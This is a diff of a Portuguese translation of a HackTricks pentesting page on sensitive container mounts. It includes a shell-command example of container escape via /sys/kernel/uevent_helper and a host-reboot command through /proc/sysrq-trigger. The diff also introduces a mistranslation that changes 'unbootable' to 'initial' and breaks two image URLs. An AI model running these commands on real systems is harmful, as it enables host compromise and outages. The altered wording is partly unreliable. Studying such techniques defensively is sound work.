@@ -6,15 +6,15 @@
 
 Outras maneiras de apoiar o HackTricks:
 
-* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Obtenha o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 
-<figure><img src="../../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
@@ -106,8 +106,8 @@ echo b > /proc/sysrq-trigger # Reinicia o host
 #### **`/proc/kcore`**
 
 * Representa a memória física do sistema no formato de core ELF.
-* A leitura pode vazar conteúdos de memória do sistema host e de outros contêineres.
-* O tamanho grande do arquivo pode levar a problemas de leitura ou falhas de software.
+* A leitura pode vazar conteúdos de memória do host e de outros contêineres.
+* O tamanho do arquivo grande pode levar a problemas de leitura ou travamentos de software.
 * Uso detalhado em [Despejando /proc/kcore em 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
 #### **`/proc/kmem`**
@@ -138,23 +138,23 @@ echo b > /proc/sysrq-trigger # Reinicia o host
 * Escrever em `/sys/kernel/uevent_helper` pode executar scripts arbitrários ao acionar `uevents`.
 *   **Exemplo de Exploração**: %%%bash
 
-### Cria uma carga útil
+#### Cria uma carga útil
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-### Encontra o caminho do host a partir da montagem OverlayFS para o contêiner
+#### Encontra o caminho do host a partir da montagem OverlayFS para o contêiner
 
 host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)
 
-### Define uevent\_helper para o helper malicioso
+#### Define uevent\_helper para o helper malicioso
 
 echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper
 
-### Aciona um uevent
+#### Aciona um uevent
 
 echo change > /sys/class/mem/null/uevent
 
-### Lê a saída
+#### Lê a saída
 
 cat /output %%%
 #### **`/sys/class/thermal`**
@@ -173,7 +173,7 @@ cat /output %%%
 #### **`/sys/firmware/efi/vars` e `/sys/firmware/efi/efivars`**
 
 * Expõe interfaces para interagir com variáveis EFI na NVRAM.
-* Má configuração ou exploração pode resultar em laptops inutilizáveis ou máquinas host ininicializáveis.
+* Má configuração ou exploração pode resultar em laptops inutilizáveis ou máquinas host iniciais.
 
 #### **`/sys/kernel/debug`**
 
@@ -186,7 +186,7 @@ cat /output %%%
 * [Compreensão e Reforço de Contêineres Linux](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
 * [Abusando de Contêineres Linux Privilegiados e Não Privilegiados](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)
 
-<figure><img src="../../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
